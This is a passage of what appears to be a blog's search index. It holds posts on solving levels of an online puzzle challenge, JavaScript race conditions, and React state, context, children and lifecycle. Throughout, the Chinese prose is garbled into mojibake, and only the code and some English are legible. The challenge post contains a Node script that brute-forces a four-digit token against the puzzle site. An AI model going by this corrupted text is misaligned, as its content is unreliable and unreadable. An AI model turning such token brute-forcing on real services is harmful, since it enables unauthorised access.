], [ 'f', 'g' ], [ 'h', 'i' ], [ 'i', 'j' ], [ 'k', 'l' ], [ 'l', 'm' ], [ 'n', 'o' ], [ 'o', 'p' ], [ 'q', 'r' ], [ 'r', 's' ], [ 't', 'u' ], [ 'u', 'v' ], [ 'w', 'x' ], [ 'x', 'y' ], [ 'z', '{' ], [ '{', '|' ], [ '}', '~' ] ], // 5 çš„å€æ•¸ [ [ '\"', '#' ], [ '#', '$' ], [ \"'\", '(' ], [ '(', ')' ], [ ',', '-' ], [ '-', '.' ], [ '1', '2' ], [ '2', '3' ], [ '6', '7' ], [ '7', '8' ], [ ';', '&lt;' ], [ '&lt;', '=' ], [ '@', 'A' ], [ 'A', 'B' ], [ 'E', 'F' ], [ 'F', 'G' ], [ 'J', 'K' ], [ 'K', 'L' ], [ 'O', 'P' ], [ 'P', 'Q' ], [ 'T', 'U' ], [ 'U', 'V' ], [ 'Y', 'Z' ], [ 'Z', '[' ], [ '^', '_' ], [ '_', '`' ], [ 'c', 'd' ], [ 'd', 'e' ], [ 'h', 'i' ], [ 'i', 'j' ], [ 'm', 'n' ], [ 'n', 'o' ], [ 'r', 's' ], [ 's', 't' ], [ 'w', 'x' ], [ 'x', 'y' ], [ '|', '}' ], [ '}', '~' ] ], // 7 çš„å€æ•¸ [ [ '\"', '#' ], [ '#', '$' ], [ ')', '*' ], [ '*', '+' ], [ '0', '1' ], [ '1', '2' ], [ '7', '8' ], [ '8', '9' ], [ '&gt;', '?' ], [ '?', '@' ], [ 'E', 'F' ], [ 'F', 'G' ], [ 'L', 'M' ], [ 'M', 'N' ], [ 'S', 'T' ], [ 'T', 'U' ], [ 'Z', '[' ], [ '[', '\\\\' ], [ 'a', 'b' ], [ 'b', 'c' ], [ 'h', 'i' ], [ 'i', 'j' ], [ 'o', 'p' ], [ 'p', 'q' ], [ 'v', 'w' ], [ 'w', 'x' ], [ '}', '~' ] ]] å‚™è¨»ï¼šé€™é‚Šå»ºè­°æŒ‘è‹±æ–‡æ•¸å­—çš„çµ„åˆæ¯”è¼ƒä¸æœƒå‡ºéŒ¯ã€‚ æ¥è‘—å…©å…©æ¹Šå°å°±æ˜¯ç­”æ¡ˆäº†ï¼Œä¾‹å¦‚ï¼šEFEFABMN é—œå¡åå›› https://r30challenge.herokuapp.com/lv14.php?token=5371 é€™ä¸€é¡Œè¦çŒœå››ä½æ•¸å­—ï¼ˆ0000~9999ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä¸€é–‹å§‹å°±æš´åŠ›è§£ï¼š 1234567891011121314151617181920212223242526// é€™æ®µåªèƒ½åœ¨ Node.js ä¸Šè·‘const request = require('request');~async function() { for (let i=0; i&lt;10000; i++) { let query = i; if (query &lt; 10) { // 0001 ~ 0009 query = '000' + query; } else if (query &lt; 100) { // 0010 ~ 0099 query = '00' + query; } else if (query &lt; 1000) { // 0100 ~ 0999 query = '0' + query; } // é¡¯ç¤ºç›®å‰çŒœçš„æ•¸å­— console.log(query); await new Promise((resolve) =&gt; { request(`https://r30challenge.herokuapp.com/lv14.php?token=${query}` , (err, res, body) =&gt; { console.log(body); resolve(); }) }) }}() é€™è£¡ç”¨ Promise ä¾†è™•ç†éåŒæ­¥çš„å•é¡Œï¼Œçœ‹ä¸æ‡‚è©±å¯ä»¥åƒè€ƒ Promise çš„å°æŠ€å·§ã€‚ ä¸éé€™å€‹ response çš„å›å‚³æ™‚é–“æ˜é¡¯æ€ªæ€ªçš„ï¼Œåƒå‡ºç¾ 1 3 5 7 çš„æ™‚å€™æœƒç‰¹åˆ¥æ…¢ã€‚æ‰€ä»¥ä¸€æ¨£æŸ¥äº†æ”»ç•¥ï¼Œç™¼ç¾åŸä¾†æ˜¯ å¹¾ A å¹¾ B çŒœæ•¸å­— çš„å°éŠæˆ²ã€‚è©±èªªå›ä¾†æˆ‘é‚„çœŸçš„æ²’æœ‰ç©éé€™ç¨®çŒœæ•¸å­—éŠæˆ² (Â´-Ï‰-ï½€) æ‰€ä»¥é€™é¡Œçš„æ­£ç¢ºè§£æ³•æ‡‰è©²æ˜¯å…ˆæ‰¾å‡ºæ‰€æœ‰å°çš„æ•¸å­—ï¼Œåœ¨æ’æˆå°çš„é †åºã€‚ é—œå¡åäº” https://r30challenge.herokuapp.com/lv15.php?token=ssGAAAAA é€™ä¸€é¡Œè¦æŠŠé€™å€‹ function è§£å‡ºä¾†ï¼š 123456789101112131415161718192021function isTokenValid($token) { // å¹¾é» $h = date('H'); // å¹¾åˆ† $m = date('i'); // å¹¾é» * å¹¾åˆ† + 42 $a = $h * $m + 42; // å„²å­˜ token è½‰æˆ ASCII å¾Œçš„ç¸½å’Œ $count = 0; // å¾ 0~7ï¼Œä»£è¡¨ token æ˜¯ 8 å€‹å­— for($i = 0; $i &lt; 8; $i++) { // è½‰æˆ ASCII å¾Œè¦åœ¨æ¸› 65 $count += ord($token[$i]) - 65; } // ç•¶ $a &lt;= 100 çš„æ™‚é€™é¡Œå°±ç„¡è§£ if ($count &lt;= 100) { return false; } // token çš„ç¸½å’Œè¦æ˜¯ $a çš„å› æ•¸ return $a % $count === 0;} é€™é¡Œæˆ‘æƒ³ä¸å‡ºæš´åŠ›è§£çš„è§£æ³•ï¼Œæ‰€ä»¥æˆ‘æ˜¯ç”¨æœ€ç¬¨çš„æ–¹æ³•ä¾†è§£ï¼š å…ˆç®—å‡ºä¸‹ä¸€æ¬¡ $a çš„å€¼ï¼ˆæ¯”è¼ƒä¸ç”¨è¶•æ™‚é–“ï¼‰ æ‰¾å‡º $a çš„æ‰€æœ‰å› æ•¸ æŸ¥ ASCII è¡¨æ¹Šå‡ºå› æ•¸ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// æ‰¾å‡ºä¸‹ä¸€æ¬¡çš„ $afunction getCode () { $h = date('H'); $m = date('i') + 1; $a = $h * $m + 42; return $a;}// æ‰¾å› æ•¸function getFactors($n) { $result = ''; for($i=101; $i&lt;=$n; $i++) { if ($n % $i === 0) { $result .= ' ' . $i; } } return $result;}// è¨ˆç®— token çš„ç¸½å’Œfunction getCount($token) { $count = 0; for($i = 0; $i &lt; 8; $i++) { $count += ord($token[$i]) - 65; } return $count;}function getASCII() { for ($i=65; $i&lt;=90; $i++) { echo chr($i) . '=' . $i-65 . '&lt;br&gt;'; } echo '&lt;hr&gt;'; for ($i=97; $i&lt;=122; $i++) { echo chr($i) . '=' . $i-65 . '&lt;br&gt;'; }}// ä¸‹ä¸€æ¬¡çš„ A$nextA = getCode();echo 'ä¸‹ä¸€æ¬¡çš„ $a = ' . date('H') . ' x ' . date('i') + 1 . ' + ' . '42' . ' = ' . $nextA . '&lt;br&gt;';echo 'æ‰€æœ‰ $a çš„å› æ•¸ï¼š' . getFactors($nextA) . '&lt;br&gt;';echo 'token çš„ ASCII ç¸½å’Œï¼š' . getCount('sssBAAAA') . '&lt;br&gt;';echo 'æ˜¯ä¸æ˜¯æ­£ç¢ºçš„ tokenï¼š';var_dump(isTokenValid('sssBAAAA'));echo '&lt;hr&gt;';getASCII();echo '&lt;hr&gt;';echo date('H-i'); ä¸‹é¢åªæ˜¯ç‚ºäº†è®“ output æ¯”è¼ƒå¥½è®€æ‰å¯«é‚£ä¸€é•·ä¸²ï¼š ç¸½ä¹‹ï¼Œå°±æ˜¯æŸ¥åˆ°å°ç‚ºæ­¢å°±ç ´é—œäº†ã€‚","link":"/2022/02/11/r30-challenge-record/"},{"title":"ç†è§£ä»€éº¼æ˜¯ race-condition","text":"å¾ˆé‡è¦çš„æ±è¥¿ï¼ èˆ‰å€‹ä¾‹å­é€™å…©å€‹ request éƒ½æ˜¯å»è®€å–æ›¸ç±çš„è³‡æ–™ï¼Œè«‹å•è¼¸å‡ºçµæœæœƒæ˜¯ï¼Ÿ å‚™è¨»ï¼šAPI ä¾†æº 12345678910const request = require('request');const API_ENDPOINT = 'https://lidemy-book-store.herokuapp.com';request(`${API_ENDPOINT}/books/1`, (err, res, body) =&gt; { console.log('1', body)})request(`${API_ENDPOINT}/books/2`, (err, res, body) =&gt; { console.log('2', body)}) é›–ç„¶ä½ ä¸€å®šæœƒä»¥ç‚ºæ˜¯æŒ‰ç…§é †åºï¼š 1 =&gt; 2ï¼Œä½†å¯¦éš›ä¸Šä¸¦ä¸æ˜¯é€™æ¨£å­ï¼š ç‚ºä»€éº¼æœƒé€™æ¨£å­ï¼Ÿ 1. å› ç‚ºä½ ä¸çŸ¥é“ request å¯¦éš›é€åˆ°ä¼ºæœå™¨çš„æ™‚é–“ æœ‰å¯èƒ½ç¬¬ä¸€å€‹å…ˆé€åˆ°ï¼Œä¹Ÿæœ‰å¯èƒ½ç¬¬äºŒå€‹å…ˆé€åˆ°ï¼Œé€™å€‹æ²’æœ‰çµ•å°ã€‚ 2. å› ç‚ºä½ ä¸çŸ¥é“ server å¯¦éš›ä¸Šå¾—èŠ±å¤šä¹…æ™‚é–“è™•ç†ä½ çš„ request å‡è¨­ç¾åœ¨çœŸçš„ç¬¬ä¸€å€‹å…ˆé€åˆ°å¥½äº†ï¼Œä½ ä¹Ÿæ²’è¾¦æ³•ç¢ºä¿ç¬¬ä¸€å€‹æœƒè™•ç†çš„æ¯”ç¬¬äºŒå€‹å¿«ï¼Œå› ç‚ºæœ‰å¯èƒ½ server èŠ±äº†æ¯”è¼ƒå¤šæ™‚é–“è™•ç†ç¬¬ä¸€å€‹ï¼Œæ‰€ä»¥æœ€å¾Œç¬¬äºŒå€‹ request å…ˆå›ä¾†ï¼Œé€™ä¹Ÿæ˜¯æœ‰å¯èƒ½çš„ã€‚ 3. å› ç‚ºä½ ä¸çŸ¥é“ sever å‚³ response å›ä¾†çš„å¯¦éš›æ™‚é–“ã€‚ ä¸€æ¨£çš„æ„æ€ï¼Œsever å‚³æ±è¥¿å›ä¾†ä¹Ÿæ˜¯ä¸€å€‹ç„¡æ³•é ä¼°çš„æ™‚é–“ï¼Œæ‰€ä»¥é€™å€‹ä¹Ÿæœƒå½±éŸ¿æœ€å¾Œçš„çµæœã€‚ é€™è£¡ä¹Ÿæœ‰ä¸€å€‹å¾ˆå¥½çš„è§£é‡‹ï¼š 12order('ä¸€ä»½æ´‹è”¥åœˆ')order('ä¸€ä»½æ¼¢å ¡') æˆ‘å…ˆå¾Œç™¼é€äº†å…©å€‹ orderï¼Œè€Œé¤é»é€ä¾†çš„é †åºå°±æœƒæ˜¯ æ´‹è”¥åœˆ =&gt; æ¼¢å ¡ å—ï¼Ÿ ä¸ä¸€å®šå§ï¼å¯èƒ½æœƒè·Ÿå»šæˆ¿åšèœçš„ç¿’æ…£æˆ–å„ç¨®åŸå› éƒ½æœƒå½±éŸ¿åˆ°é€é¤é †åºã€‚ æ‰€ä»¥é€™å€‹å°±å«åšã€Œrace conditionã€ï¼Œæœ€å¾Œçš„çµæœå®Œå…¨æ†‘ç•¶ä¸‹ä»–å€‘ç«¶çˆ­çš„çµæœï¼Œä½ åœ¨äº‹å‰ç„¡æ³•é æ–™çµæœæ˜¯ä»€éº¼ã€‚ æ‰€ä»¥æ€éº¼ç¢ºä¿åŸ·è¡Œé †åºï¼Ÿæ‹¿åˆ°ç¬¬ä¸€å€‹ response å¾Œæ‰ç™¼å‡ºç¬¬äºŒå€‹ requestï¼š 12345678910const request = require('request');const API_ENDPOINT = 'https://lidemy-book-store.herokuapp.com';// ç¬¬ä¸€å€‹ request request(`${API_ENDPOINT}/books/1`, (err, res, body) =&gt; { console.log('1', body) // æ‹¿åˆ° response æ‰å¾Œç™¼ç¬¬äºŒå€‹ request request(`${API_ENDPOINT}/books/2`, (err, res, body) =&gt; { console.log('2', body) })}) é€™æ¨£é †åºå°±çµ•å°æœƒæ˜¯ 1 =&gt; 2ï¼Œå› ç‚ºç¬¬äºŒå€‹ request æ˜¯åœ¨ç¬¬ä¸€å€‹ request è™•ç†å®Œå¾Œæ‰ç™¼å‡ºå»çš„ã€‚","link":"/2022/01/08/race-condition/"},{"title":"React é—œæ–¼ render","text":"ä¸€é–‹å§‹æ²’æƒ³é€šçš„æ±è¥¿ï¼Œæ‰€ä»¥è¨˜ä¸€ä¸‹ã€‚ ç°¡è¿°æ¯ç•¶ Component è£¡çš„ state æ”¹è®Šæ™‚ï¼ŒReact å°±æœƒé‡æ–°æŠŠé€™å€‹ Component render ä¸€éï¼ˆrender å¯ä»¥æƒ³æˆæ˜¯ç•«é¢å…¨éƒ¨æ“¦æ‰é‡ç•«ï¼Œä½†å¯¦éš›ä¸Šåªæœ‰æŠŠæ”¹è®Šçš„åœ°æ–¹é‡ç•«è€Œå·²ï¼‰ ä¸éè¦å¼·èª¿ä¸€ä¸‹ render çš„éƒ¨åˆ†æ˜¯ï¼š ä»¥ component ç‚ºå–®ä½ã€‚ ä»¥ component ç‚ºå–®ä½ã€‚ ä»¥ component ç‚ºå–®ä½ã€‚ ä¾‹å¦‚èªª &lt;App /&gt; åº•ä¸‹æœ‰ &lt;Counter /&gt;ï¼Œé€™ä¸ä»£è¡¨ç•¶ &lt;Counter /&gt; çš„ state æ”¹è®Šæ™‚ &lt;App /&gt; ä¹Ÿæœƒé‡æ–° renderã€‚æœƒé‡æ–° render çš„åªæœ‰ &lt;Counter /&gt;ï¼Œå› ç‚ºé‚£æ˜¯å®ƒçš„ stateï¼Œä¸æ˜¯ &lt;App /&gt; çš„ã€‚ ä¸éå¦‚æœæ˜¯ &lt;App /&gt; è¢«é‡æ–° render çš„è©±ï¼Œé‚£ &lt;Counter /&gt; ä¹Ÿä¸€å®šæœƒè¢«é‡æ–° renderï¼Œå› ç‚ºå®ƒåœ¨ &lt;App/&gt; åº•ä¸‹ï¼Œæ‰€ä»¥ç†æ‰€ç•¶ç„¶æœƒè¢«é‡æ–° renderã€‚ é€™å€‹å…©å€‹å·®ç•°è¦å¤šæƒ³ä¸€ä¸‹ï¼Œå¯èƒ½æœ‰é»æŠ½è±¡ï¼Œä¸éé‚„æ˜¯è¦åˆ†æ¸…æ¥šå®ƒå€‘çš„å·®åˆ¥ã€‚","link":"/2022/04/06/react-about-render/"},{"title":"React é—œæ–¼ state çš„ä¸€äº›æ¦‚å¿µ","text":"ç°¡çŸ­ä½†é‡è¦ã€‚ ç°¡è¿°åœ¨ React è£¡é¢æ›´æ–° state çš„æ–¹å¼æ˜¯é€é setState ä¾†åˆ¤æ–·æ–°çš„è·ŸèˆŠçš„ state å·®åˆ¥ï¼Œå¦‚æœæ²’æœ‰å·®ç•°çš„è©±æ˜¯ä¸æœƒæ›´æ–°çš„ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œä½ æ‡‰è©²è¦å»ºç«‹ä¸€å€‹æ–°çš„ state è€Œä¸æ˜¯ç›´æ¥å»æ”¹ stateã€‚ å¦å¤– useState å›å‚³çš„ setState ä¸€èˆ¬ä¾†èªªæ˜¯éåŒæ­¥çš„ï¼Œæ‰€ä»¥ä½ æ²’è¾¦æ³•åœ¨ set å®Œä»¥å¾Œå°±é¦¬ä¸Šæ‹¿åˆ°æœ€æ–°çš„ stateï¼š 12345678910111213const handleAddTodo = (content) =&gt; { setTodos([ { id, content, isDone: false, }, ...todos, ]); // ä¸æœƒæ˜¯æ–°å¢ä»¥å¾Œçš„ state console.log('todos', todos) id++;}; åªæ˜¯å€‹ç°¡çŸ­çš„ç­†è¨˜ï¼Œä½†é€™äº›è§€å¿µé‚„è »é‡è¦çš„ï¼Œæ‰€ä»¥é‚„æ˜¯å¯«ä¸‹ä¾†å§ã€‚","link":"/2022/04/06/react-about-state/"},{"title":"Reactï¼é—œæ–¼ useContext æ›´å¥½çš„å¯«æ³•","text":"ç¸½æœƒæœ‰æ›´å¥½çš„å¯«æ³•ã€‚ ç°¡è¿°å› ç‚ºè‡ªå·±ç”¨åˆ° useContext çš„é »ç‡ä¸é«˜ï¼Œæ‰€ä»¥åœ¨ç”¨çš„æ™‚å€™éƒ½ç”¨æ¯”è¼ƒæ­£çµ±çš„æ–¹å¼ä¾†æ’°å¯«ã€‚ åˆ°äº†ç¾åœ¨æ‰ç™¼ç¾åŸæœ¬æœ‰ä¸€ç¨®æ›´å¥½çš„å¯«æ³•ï¼Œå¯ä»¥æŠŠé‚è¼¯äº¤çµ¦ Context è‡ªå·±ä¾†è™•ç†ï¼Œè€Œä¸æ˜¯å¯«åœ¨æ ¹å…ƒç´ ä¸Šã€‚ç¸½ä¹‹é€™æ˜¯å€‹è »ä¸éŒ¯çš„ç·´ç¿’ï¼Œæ‰€ä»¥æƒ³è¨˜éŒ„ä¸€ä¸‹ã€‚ åŸæœ¬çš„å¯«æ³•å‡è¨­æœ‰ä¸€å€‹å¯ä»¥è‡ªå®šç¾©ä¸»é¡Œçš„ Contextï¼Œé‚£æœ€æ­£çµ±çš„å¯«æ³•æœƒåƒé€™æ¨£ï¼š 1234567891011import { ThemeContext } from \"../contexts/ThemeContext\"function App () { const [theme, setTheme] = useState('blue') return ( &lt;ThemeContext.Provider value={theme, setTheme}&gt; &lt;Component /&gt; &lt;/ThemeContext.Provider&gt; )} é€™æ¨£å­å¯«æ˜¯æ²’ä»€éº¼ä¸å°ï¼Œä½†æœ‰å¹¾å€‹ç¼ºé»ï¼š Context çš„é‚è¼¯å¿…é ˆè·Ÿ App å¯«åœ¨ä¸€èµ·ã€‚æƒ³æƒ³çœ‹ç•¶ App æœ‰å…¶ä»–é‚è¼¯çš„è©±ï¼Œæ˜¯ä¸æ˜¯æœ‰é»æ··äº‚ï¼Ÿ å»¶çºŒç¬¬ä¸€å€‹å•é¡Œï¼Œç•¶æœ‰åˆ¥çš„ Context ä¹Ÿæ”¾åœ¨ App æ™‚ï¼Œå°±æœƒåƒé›œæ›´å¤šé‚è¼¯è·Ÿå„ç¨® Providerã€‚ åŸºæ–¼ä»¥ä¸Šå…©é»ï¼Œæ‰€ä»¥æ‰æœƒæœ‰æ¥ä¸‹ä¾†è¦ä»‹ç´¹çš„å¯«æ³•ï¼Œè®“ä½ å¯ä»¥æŠŠã€Œé‚è¼¯å°è£åœ¨ Context æœ¬èº«ã€ï¼Œè€Œä¸æ˜¯æ··åœ¨ä¸€èµ·å¤§é›œç‡´ã€‚ æ›´å¥½çš„å¯«æ³•é€™ç¨®ä½œæ³•å°±æ˜¯ç•¶æˆ‘å€‘åœ¨å»ºç«‹ Context æ™‚ï¼Œé †ä¾¿å»ºç«‹ä¸€å€‹ã€Œå°ˆå±¬ Context çš„å…ƒä»¶ã€ï¼Œè½èµ·ä¾†æœ‰é»è«åï¼Œä½†ä½ çœ‹ code å°±æ‡‰è©²æ‡‚äº†ï¼š 1234567891011121314151617// contexts/ThemeContextimport { createContext } from 'react'// å­˜å– context æ™‚é‚„æ˜¯å¾—é€éä»–ï¼Œæ‰€ä»¥è¦ export å‡ºå»export const ThemeContext = createContext()// å»ºç«‹ä¸€å€‹å…ƒä»¶åŒ…è£å¾Œå† export å‡ºå»export function ThemeProvider ({ children }) { const [theme, setTheme] = useState({ color: 'blue' }) return ( &lt;ThemeContext.Provider value={{theme, setTheme}}&gt; {children} &lt;/ThemeContext.Provider&gt; )} æ¥è‘— App çš„éƒ¨åˆ†å°±å¯ä»¥æ”¹å¯«æˆé€™æ¨£ï¼š 123456789import { ThemeProvider } from \"../contexts/ThemeContext\"function App () { return ( &lt;ThemeProvider&gt; &lt;Component /&gt; &lt;/ThemeProvider&gt; )} æ‡‰è©²ä¸€çœ¼å°±èƒ½çœ‹å‡ºé€™è·ŸåŸæœ¬çš„å·®åˆ¥äº†å§ï¼Ÿç¾åœ¨é€™å€‹æ˜é¡¯ä¹¾æ·¨å¾ˆå¤šï¼Œè€Œä¸”æ—¥å¾Œè¦ç¶­è­·çš„è©±å°±åªè¦åˆ°å°æ‡‰çš„ Context å»ä¿®æ”¹å°±å¥½ï¼Œç°¡ç›´ä¸€èˆ‰å…©å¾—ã€‚ ä¸éèªªç©¿äº†æˆ‘å€‘åªæ˜¯å·§å¦™çš„é‹ç”¨äº† children ä¾†åŒ…è£è€Œå·²ï¼Œå…¶å¯¦è·ŸåŸæœ¬çš„å¯«æ³•åšçš„äº‹æƒ…ä¸€æ¨¡ä¸€æ¨£ã€‚ Bonusï¼šä½¿ç”¨ custom hook ä¾†æ¸›å°‘ boilerplateåœ¨å­˜å– Context çš„æ™‚å€™ï¼Œæˆ‘å€‘å¤šåŠæœƒé€™æ¨£å¯«ï¼š 123456789import { useContext } from \"react\"import { ThemeContext } from \"contexts/ThemeContext\"function Component () { const { theme } = useContext(ThemeContext) return ( ... )} é€™æ¨£ç•¶ç„¶æ²’å•é¡Œï¼Œä½†å°±æ˜¯æ¯æ¬¡éƒ½è¦ useContext è·Ÿ ThemeContext æœ‰é»å°éº»ç…©è€Œå·²ã€‚ æ‰€ä»¥æˆ‘å€‘å¯ä»¥ç”¨ custom hook ä¾†åšåŒ…è£ï¼Œåƒé€™æ¨£ï¼š 1234567891011121314// hooks/useTheme.jsimport { useContext } from \"react\"import { ThemeContext } from \"contexts/ThemeContext\"export const useTheme = () =&gt; { const context = useContext(ThemeContext) // å¦‚æœæ²’åœ¨æ­£ç¢ºçš„åœ°æ–¹ä½¿ç”¨ Context if (context === undefined) { throw new Error('useTheme() must be used inside a ThemeProvider') } return context} æ¥è‘—å°±å¯ä»¥ç›´æ¥æ‹¿ä¾†ç”¨äº†ï¼š 12345678import { useTheme } from \"hooks/useTheme\"function Component () { const { theme } = useTheme() return ( ... )}","link":"/2022/06/19/react-better-way-to-use-context/"},{"title":"Reactï¼é—œæ–¼ children é€™å€‹ props çš„é©ç”¨æ™‚æ©Ÿ","text":"å¸Œæœ›å¯«å‡ºè¶Šä¾†è¶Šå„ªé›…çš„ Codeã€‚ ç°¡è¿°ä»¥å‰æˆ‘ä¸€ç›´ä¸å¤ªçŸ¥é“ children é€™å€‹ props å¯ä»¥ç”¨åœ¨ä»€éº¼åœ°æ–¹ï¼Ÿåªè¦ºå¾—ä»–æ˜¯è »é‚Šç·£çš„æ±è¥¿ã€‚ ä¸éæœ€è¿‘åœ¨çœ‹æ•™å­¸å½±ç‰‡æ™‚é«”æœƒåˆ°äº† children çš„å¦™ç”¨ä¹‹è™•ï¼Œæ‰€ä»¥æ±ºå®šå¯«ä¸€ç¯‡ç°¡çŸ­çš„ç­†è¨˜ä¾†è¨˜éŒ„ä¸€ä¸‹ã€‚ Modalä¸€å€‹æœ€ç°¡å–®çš„ç¯„ä¾‹å°±æ˜¯ Modalã€‚ æ€éº¼èªªï¼Ÿæƒ³æƒ³çœ‹ï¼Œä¸€å€‹ modal çš„å…§å®¹æœ‰å¯èƒ½æ˜¯é€™æ¨£ï¼š ä¹Ÿæœ‰å¯èƒ½æ˜¯é€™æ¨£ï¼š ä»¥ç¬¬ä¸€å€‹ä¾†èªªçš„è©±ä»–çš„çµæ§‹æ‡‰è©²æœƒé•·é€™æ¨£ï¼š 12345678910export default function Modal() { return ( &lt;div className='modal-backdrop'&gt; &lt;div className=\"modal\"&gt; &lt;h2&gt;Some kind of modal title&lt;/h2&gt; &lt;p&gt;Some kind of modal content like so.&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; )} ç¬¬äºŒå€‹çš„è©±æœƒé•·é€™æ¨£ï¼š 123456789101112131415export default function Modal() { return ( &lt;div className='modal-backdrop'&gt; &lt;div className=\"modal\"&gt; &lt;h2&gt;Some kind of modal title&lt;/h2&gt; &lt;img className='sample-img' src=\"...\" alt='sample'/&gt; &lt;p&gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Ex nostrum delectus et velit recusandae quam eveniet? &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; )} é€™å€‹æ™‚å€™å°±è¦æ€è€ƒï¼Œå¦‚æœæˆ‘æƒ³è®“ Modal çš„å¯é‡ç”¨æ€§ç™¼æ®åˆ°æœ€å¤§çš„è©±ï¼Œè©²æ€éº¼åšæ¯”è¼ƒå¥½ï¼Ÿå°¤å…¶æ˜¯é€™ç¨®çµæ§‹å¯èƒ½ä¸å¤ªä¸€æ¨£çš„æƒ…æ³ä¸‹ã€‚ å…¶å¯¦å°±æ˜¯æ¨™é¡Œèªªçš„ï¼Œé€™å°±æ˜¯ children çš„é©ç”¨æ™‚æ©Ÿã€‚ å¦‚æœç”¨ props çš„è©±ï¼Œæˆ‘æ²’æœ‰è¾¦æ³•åŒæ™‚è®“ Modal æ”¯æ´ç¬¬ä¸€ç¨®çµæ§‹ï¼Œåˆæ”¯æ´ç¬¬äºŒç¨®çµæ§‹ã€‚ å¯æ˜¯ç”¨ children çš„è©±å°±ä¸åŒäº†ï¼Œchildren æœ‰ä¸€å€‹æœ€å¤§çš„ç‰¹è‰²æ˜¯å¯ä»¥æŠŠ JSX ç•¶ä½œ props å‚³çµ¦å…ƒä»¶ã€‚ æ‰€ä»¥å‘¢ï¼Œè¦é”åˆ°æœ€é–‹å§‹æåˆ°çš„éœ€æ±‚çš„è©±ï¼Œå¯ä»¥é€™æ¨£å­å¯«ï¼š 123456789export default function Modal({ children }) { return ( &lt;div className='modal-backdrop'&gt; &lt;div className=\"modal\"&gt; {children} &lt;/div&gt; &lt;/div&gt; )} æ¥è‘—ç•¶æˆ‘è¦ç”¨ Modal çš„æ™‚å€™ï¼Œåªè¦æŠŠå…§å®¹ç•¶ä½œ children å‚³é€²å»å°±æå®šäº†ï¼š 123456789&lt;Modal&gt; &lt;h2&gt;Some kind of modal title&lt;/h2&gt; &lt;img className='sample-img' src=\"...\" alt='sample'/&gt; &lt;p&gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Ex nostrum delectus et velit recusandae quam eveniet? &lt;/p&gt;&lt;/Modal&gt; è¼•è¼•é¬†é¬†ï½","link":"/2022/06/08/react-children-usage/"},{"title":"React é‡æ–°è¤‡ç¿’ class component çš„ç”Ÿå‘½é€±æœŸ","text":"å†æ¬¡è¤‡ç¿’ã€‚ ç°¡è¿°ä¹‹å‰æœ‰å¯«éä¸€ç¯‡ï¼šReact class component çš„ç”Ÿå‘½é€±æœŸï¼Œé€™ç¯‡å°±ç•¶ä½œè¤‡ç¿’å†ç·´ç¿’ä¸€æ¬¡ã€‚ é€™ç¯‡ä¸»è¦æ˜¯åƒè€ƒ W3C å®˜æ–¹æ–‡ä»¶ ä¾†åšçš„ç­†è¨˜ï¼ŒæœƒæŒ‘ W3C æ˜¯å› ç‚ºå®ƒå¯«çš„æ¯” React å®˜æ–¹æ–‡ä»¶ ç°¡æ½”ä¸€é»ï¼Œä½†å¦‚æœæƒ³çŸ¥é“æ›´ç´°ç¯€çš„è©±é‚„æ˜¯å»ºè­°çœ‹ React çš„å®˜æ–¹æ–‡ä»¶æœƒæ›´å®Œæ•´ã€‚ æ­£é¡Œé¦–å…ˆæœƒåˆ†æˆä¸‰å€‹éšæ®µï¼š Mounting Updating Ummounting å†è²¼ä¸€æ¬¡é€™å€‹å¥½ç”¨çš„åœ–ï¼š Mounting éšæ®µåŸ·è¡Œé †åºï¼š constructor() getDerivedStateFromProps() render() componentDidmount constructoré™„è¨»ï¼šåªæœƒåŸ·è¡Œä¸€æ¬¡ ç¬¬ä¸€å€‹æœƒè¢«å…ˆåŸ·è¡Œåˆ°çš„ functionï¼Œæœƒæ¥æ”¶ propsï¼ˆä¾†è‡ª React.Componentï¼‰é€™å€‹åƒæ•¸ï¼Œé™¤æ­¤ä¹‹å¤–ä¹Ÿæœƒåœ¨é€™è£¡å»ºç«‹ state çš„åˆå§‹å€¼ã€‚ é †ä¾¿åšå€‹è£œå……ï¼Œç‚ºäº†ç¢ºä¿æ–°å»ºç«‹çš„ Component èƒ½å¤ æ­£ç¢ºé‹ä½œï¼Œä¸€å®šè¦è¨˜å¾—å…ˆ super(props) ç¹¼æ‰¿æ‰€æœ‰ React.Component çš„æ±è¥¿ï¼Œ getDerivedStateFromPropsç¬¬äºŒå€‹æœƒè¢«åŸ·è¡Œçš„ functionï¼Œæœƒæ¥å— propsï¼ˆå¾å¤–é¢æ¥æ”¶åˆ°çš„ï¼‰å’Œ stateï¼ˆåœ¨ constructor å»ºç«‹çš„ï¼‰ã€‚ é€™å€‹éšæ®µå¯ä»¥æ ¹æ“š props ä¾†æ›´æ–°æˆ–æ·»åŠ  stateï¼Œå‘æ˜¯é€™æ¨£ï¼š 123456789101112131415161718192021222324class App extends React.Component { constructor(props) { console.log(\"1. constructor\"); super(props); // åŸæœ¬æ˜¯ red this.state = { favoritecolor: \"red\" }; } // è¨˜å¾—å®ƒæ˜¯ã€Œstaticã€æ–¹æ³•ï¼Œæ‰€ä»¥ä¸€å®šè¦åŠ ä¸Šå‰ç¶´ // æœƒæ‹¿åˆ°é€™å€‹å…ƒä»¶çš„ props è·Ÿ state static getDerivedStateFromProps(props, state) { console.log(\"2. getDerivedStateFromProps\"); // å›å‚³çš„æ±è¥¿å°±æœƒè®Šæˆæ–°çš„ state return { favoritecolor: props.favcol }; } render() { console.log(\"3. render\"); // åŸæœ¬æ˜¯ redï¼Œä½†æœƒè¢« getDerivedStateFromProps æ”¹æˆ yello return &lt;h1&gt;My Favorite Color is {this.state.favoritecolor}&lt;/h1&gt;; }}// å‚³ä¸€å€‹ props é€²å»ReactDOM.render(&lt;App favcol=\"yello\" /&gt;, document.getElementById(\"root\")); ç¯„ä¾‹å¯ä»¥åˆ° é€™è£¡ åƒè€ƒã€‚ renderç¬¬ä¸‰å€‹æœƒè¢«åŸ·è¡Œçš„ functionï¼Œé€™éšæ®µè² è²¬æŠŠ HTML è®Šæˆ DOMã€‚ componentDidmounté™„è¨»ï¼šåªæœƒåŸ·è¡Œä¸€æ¬¡ é™„è¨»ï¼šå¦‚æœè·Ÿ getDerivedStateFromProps æ”¹çš„æ˜¯åŒä¸€å€‹ stateï¼Œé‚£æœ€å¾Œæœƒå¥—ç”¨å®ƒçš„çµæœã€‚ 